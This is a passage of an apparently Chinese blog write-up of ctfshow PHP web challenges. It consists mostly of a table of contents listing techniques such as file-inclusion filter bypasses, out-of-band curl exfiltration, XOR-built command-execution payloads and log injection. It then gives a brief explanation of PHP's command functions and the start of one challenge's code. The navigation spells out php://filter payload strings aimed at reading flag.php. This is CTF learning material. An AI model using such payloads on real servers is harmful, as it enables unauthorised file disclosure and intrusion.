class="nav-text">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter-read-convert-iconv-utf-8-utf-16le-resource-flag-php"><span class="nav-number">3.16.3.4.</span> <span class="nav-text">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter-read-convert-quoted-printable-encode-resource-flag-php-1"><span class="nav-number">3.16.3.5.</span> <span class="nav-text">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web113"><span class="nav-number">3.17.</span> <span class="nav-text">web113</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-require-once-%E7%BB%95%E8%BF%87%E4%B8%8D%E8%83%BD%E9%87%8D%E5%A4%8D%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E9%99%90%E5%88%B6-%E7%9B%AE%E5%BD%95%E6%BA%A2%E5%87%BA"><span class="nav-number">3.17.1.</span> <span class="nav-text">知识点:require_once 绕过不能重复包含文件的限制(目录溢出)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web114"><span class="nav-number">3.18.</span> <span class="nav-text">web114</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web115"><span class="nav-number">3.19.</span> <span class="nav-text">web115</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#str-replace-%E5%87%BD%E6%95%B0"><span class="nav-number">3.19.1.</span> <span class="nav-text">str_replace()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#trim-%E5%87%BD%E6%95%B0"><span class="nav-number">3.19.2.</span> <span class="nav-text">trim()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8-%E5%AF%B9%E4%BA%8E%E7%BB%95%E8%BF%87%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%B0%B1%E6%8B%BFASCII%E7%A0%81%E6%8A%8A%E6%89%80%E6%9C%89%E5%AD%97%E7%AC%A6%E8%B7%91%E4%B8%80%E9%81%8D"><span class="nav-number">3.19.3.</span> <span class="nav-text">注:对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">突破函数禁用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web123"><span class="nav-number">4.1.</span> <span class="nav-text">web123</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-SERVER-%E2%80%98argv%E2%80%99"><span class="nav-number">4.1.0.1.</span> <span class="nav-text">关于$_SERVER[‘argv’]</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-%E9%80%9A%E8%BF%87eval%E8%BE%93%E5%87%BAflag"><span class="nav-number">4.1.1.</span> <span class="nav-text">解法一:通过eval输出flag</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">PHP命名规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7bypass"><span class="nav-number">4.1.1.2.</span> <span class="nav-text">PHP的字符串解析特性bypass</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-%E9%80%9A%E8%BF%87eval%E8%B5%8B%E5%80%BC%E7%BB%99fl0g%E6%8B%BF%E5%88%B0flag"><span class="nav-number">4.1.2.</span> <span class="nav-text">解法二:通过eval赋值给fl0g拿到flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web125"><span class="nav-number">4.2.</span> <span class="nav-text">web125</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extract-array-%E7%94%A8%E6%B3%95"><span class="nav-number">4.2.1.</span> <span class="nav-text">extract($array)用法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web126"><span class="nav-number">4.3.</span> <span class="nav-text">web126</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web127"><span class="nav-number">4.4.</span> <span class="nav-text">web127</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-SERVER-%E2%80%98QUERY-STRING%E2%80%99"><span class="nav-number">4.4.1.</span> <span class="nav-text">#绕过$_SERVER[‘QUERY_STRING’]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%90%88%E6%B3%95%E5%8F%98%E9%87%8F%E5%90%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="nav-number">4.4.2.</span> <span class="nav-text">不合法变量名字符的解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web128"><span class="nav-number">4.5.</span> <span class="nav-text">web128</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E6%97%A0%E5%AD%97%E6%AF%8D%E5%87%BD%E6%95%B0"><span class="nav-number">4.5.1.</span> <span class="nav-text">#无数字无字母函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-6"><span class="nav-number">4.5.2.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func-%E5%87%BD%E6%95%B0-1"><span class="nav-number">4.5.2.1.</span> <span class="nav-text">call_user_func()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-defined-vars-%E5%87%BD%E6%95%B0"><span class="nav-number">4.5.3.</span> <span class="nav-text">get_defined_vars()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web129"><span class="nav-number">4.6.</span> <span class="nav-text">web129</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#stripos-%E5%87%BD%E6%95%B0"><span class="nav-number">4.6.1.</span> <span class="nav-text">stripos()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readfile-%E5%87%BD%E6%95%B0"><span class="nav-number">4.6.2.</span> <span class="nav-text">readfile()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">4.6.3.</span> <span class="nav-text">目录穿越</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%81%E7%82%B9-PHP%E5%AF%B9%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%8F%AA%E4%BC%9A%E6%8A%9B%E5%87%BAwarning%E8%80%8C%E4%B8%8D%E6%98%AFerror"><span class="nav-number">4.6.4.</span> <span class="nav-text">要点:PHP对无法使用的filter过滤器只会抛出warning而不是error</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web130"><span class="nav-number">4.7.</span> <span class="nav-text">web130</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F-%EF%BC%9F"><span class="nav-number">4.7.1.</span> <span class="nav-text">.+?非贪婪模式(.*？)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E9%87%8F%E8%AF%8D%E4%B8%8E%E9%9D%9E%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F"><span class="nav-number">4.7.2.</span> <span class="nav-text">常用的量词与非贪婪模式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#s%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">4.7.2.1.</span> <span class="nav-text">&#x2F;s正则匹配</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web131"><span class="nav-number">4.8.</span> <span class="nav-text">web131</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E6%9C%80%E5%A4%A7%E5%9B%9E%E6%BA%AF"><span class="nav-number">4.8.1.</span> <span class="nav-text">正则最大回溯</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F%E7%9A%84%E8%AF%A6%E8%A7%A3"><span class="nav-number">4.8.1.1.</span> <span class="nav-text">非贪婪模式的详解</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%BA%AF%E4%B8%8A%E9%99%90%E7%BB%95%E8%BF%87%E8%84%9A%E6%9C%AC"><span class="nav-number">4.8.2.</span> <span class="nav-text">回溯上限绕过脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web132"><span class="nav-number">4.9.</span> <span class="nav-text">web132</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mt-rand-%E5%87%BD%E6%95%B0"><span class="nav-number">4.9.1.</span> <span class="nav-text">mt_rand()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="nav-number">4.9.2.</span> <span class="nav-text">逻辑运算符优先级</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web133"><span class="nav-number">4.10.</span> <span class="nav-text">web133</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0%E6%9C%AC%E8%BA%AB%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">4.10.1.</span> <span class="nav-text">传递参数本身实现变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-%E5%A4%96%E5%B8%A6"><span class="nav-number">4.10.2.</span> <span class="nav-text">curl 外带</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web134"><span class="nav-number">4.11.</span> <span class="nav-text">web134</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web135-%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0"><span class="nav-number">4.12.</span> <span class="nav-text">web135(绕过命令函数)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6%EF%BC%8Cping%E5%87%BD%E6%95%B0"><span class="nav-number">4.12.1.</span> <span class="nav-text">#重定向，重命名，文件复制，ping函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web136"><span class="nav-number">4.13.</span> <span class="nav-text">web136</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E5%AF%9Fexec%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8tee%E5%91%BD%E4%BB%A4%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">4.13.1.</span> <span class="nav-text">#考察exec函数以及使用tee命令写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec-c"><span class="nav-number">4.13.2.</span> <span class="nav-text">exec($c)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web137"><span class="nav-number">4.14.</span> <span class="nav-text">web137</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E5%AF%9Fcall-user-func-%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">4.14.1.</span> <span class="nav-text">#考察call_user_func()函数的使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func%E5%87%BD%E6%95%B0"><span class="nav-number">4.14.2.</span> <span class="nav-text">call_user_func函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%96%B9%E6%B3%95-%E8%B0%83%E7%94%A8%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">4.14.2.1.</span> <span class="nav-text">第一个方法:调用类里面的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%96%B9%E6%B3%95%EF%BC%9A%E6%95%B0%E7%BB%84%E6%96%B9%E5%BC%8F%E8%B0%83%E7%94%A8"><span class="nav-number">4.14.2.2.</span> <span class="nav-text">第二个方法：数组方式调用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web138"><span class="nav-number">4.15.</span> <span class="nav-text">web138</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E6%9F%A5strripos-%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87"><span class="nav-number">4.15.1.</span> <span class="nav-text">#考查strripos()函数的使用和绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strripos-%E5%87%BD%E6%95%B0"><span class="nav-number">4.15.2.</span> <span class="nav-text">strripos()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0"><span class="nav-number">4.15.3.</span> <span class="nav-text">参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web139"><span class="nav-number">4.16.</span> <span class="nav-text">web139</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web140"><span class="nav-number">4.17.</span> <span class="nav-text">web140</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%B5%8C%E5%A5%97%E4%BD%BF%E7%94%A8-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83-intval%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">4.17.1.</span> <span class="nav-text">#函数嵌套使用+弱类型比较+intval函数绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web141"><span class="nav-number">4.18.</span> <span class="nav-text">web141</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E8%BF%9B%E8%A1%8C%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D-W"><span class="nav-number">4.18.1.</span> <span class="nav-text">#异或进行无数字字母rce+正则匹配&#x2F;^\W+$&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-match-%E2%80%98-W-%E2%80%98-v3"><span class="nav-number">4.18.1.1.</span> <span class="nav-text">preg_match(‘&#x2F;^\W+$&#x2F;‘, $v3)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E6%9E%84%E9%80%A0payload%E8%84%9A%E6%9C%AC"><span class="nav-number">4.18.1.2.</span> <span class="nav-text">异或构造payload脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web142"><span class="nav-number">4.19.</span> <span class="nav-text">web142</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E5%87%BD%E6%95%B0sleep"><span class="nav-number">4.19.1.</span> <span class="nav-text">#学习函数sleep</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep-d"><span class="nav-number">4.19.1.1.</span> <span class="nav-text">sleep($d)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web143"><span class="nav-number">4.20.</span> <span class="nav-text">web143</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97rce%E5%BC%82%E6%88%96%E8%84%9A%E6%9C%AC2-0"><span class="nav-number">4.20.1.</span> <span class="nav-text">#无字母无数字rce异或脚本2.0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce%E5%BC%82%E6%88%96%E8%84%9A%E6%9C%AC"><span class="nav-number">4.20.1.1.</span> <span class="nav-text">无字母数字rce异或脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web144"><span class="nav-number">4.21.</span> <span class="nav-text">web144</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B0%B4%E9%A2%98"><span class="nav-number">4.21.1.</span> <span class="nav-text">#水题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web145"><span class="nav-number">4.22.</span> <span class="nav-text">web145</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">4.22.1.</span> <span class="nav-text">#三目运算符绕过正则匹配</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web146"><span class="nav-number">4.23.</span> <span class="nav-text">web146</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%88%96%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">4.23.1.</span> <span class="nav-text">#逻辑或绕过正则匹配</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6%E8%84%9A%E6%9C%AC"><span class="nav-number">4.23.1.1.</span> <span class="nav-text">查看可用字符脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web147"><span class="nav-number">4.24.</span> <span class="nav-text">web147</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D-a-z0-9-isD"><span class="nav-number">4.24.1.</span> <span class="nav-text">#正则匹配&#x2F;^[a-z0-9_]*$&#x2F;isD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Acreate-function%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">4.24.2.</span> <span class="nav-text">#考点：create_function函数注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-match-%E2%80%98-a-z0-9-isD%E2%80%99-ctfshow"><span class="nav-number">4.24.2.1.</span> <span class="nav-text">preg_match(‘&#x2F;^[a-z0-9_]*$&#x2F;isD’,$ctfshow)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%A7%A3"><span class="nav-number">4.24.2.1.1.</span> <span class="nav-text">正则表达式详解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-number">4.24.2.1.2.</span> <span class="nav-text">正则表达式修饰符</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#create-funtion%E5%87%BD%E6%95%B0"><span class="nav-number">4.24.2.2.</span> <span class="nav-text">create_funtion函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web148"><span class="nav-number">4.25.</span> <span class="nav-text">web148</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E6%96%87%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="nav-number">4.25.1.</span> <span class="nav-text">#中文变量绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web149"><span class="nav-number">4.26.</span> <span class="nav-text">web149</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">4.26.1.</span> <span class="nav-text">#删除文件的条件竞争</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">4.26.1.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE"><span class="nav-number">4.26.1.2.</span> <span class="nav-text">预期解:条件竞争进行访问</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web150"><span class="nav-number">4.27.</span> <span class="nav-text">web150</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%BB%95%E8%BF%87"><span class="nav-number">4.27.1.</span> <span class="nav-text">#文件包含非预期绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="nav-number">4.27.2.</span> <span class="nav-text">日志注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web150-plus"><span class="nav-number">4.28.</span> <span class="nav-text">web150_plus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#autoload"><span class="nav-number">4.28.1.</span> <span class="nav-text">__autoload</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">160</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">117</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="web入门php篇-ctfshow(已做完) | root@wanth3f1ag">
      <meta itemprop="description" content="web入门php篇-ctfshow(已做完)">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          web入门php篇-ctfshow(已做完)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-10 13:31:35" itemprop="dateCreated datePublished" datetime="2024-11-10T13:31:35+08:00">2024-11-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:07:26" itemprop="dateModified" datetime="2025-12-01T19:07:26+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>65k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>59 分钟</span>
    </span>
</div>

            <div class="post-description">web入门php篇-ctfshow(已做完)</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h1><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><p>放一下主要的知识点</p>
<h2 id="调用命令的常用函数"><a href="#调用命令的常用函数" class="headerlink" title="调用命令的常用函数"></a>调用命令的常用函数</h2><p>在 PHP 中，exec、system 和、passthru 都是用来调用外部 Linux 命令的函数，但它们还是有区别的：</p>
<p>（1）system()</p>
<p>用于执行外部程序；<br>输出命令的执行结果到标准输出设备，并返回命令的最后一行结果；<br>可以通过传递第二个参数来捕获命令执行后的返回状态码。</p>
<p>（2）passthru()</p>
<p>用于执行外部程序；<br>将命令的原始输出直接发送到标准输出设备（通常是浏览器）；<br>不返回任何值，但可以通过第二个参数捕获命令执行后的返回状态码。</p>
<p>（3）exec()</p>
<p>用于执行外部程序；<br>不会输出结果到标准输出，而是将最后一行结果作为返回值返回；<br>如果传入第二个参数（数组），可以将所有输出保存到这个数组中；<br>第三个参数是一个整数变量，用于捕获命令执行后的返回状态码。</p>
<h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span 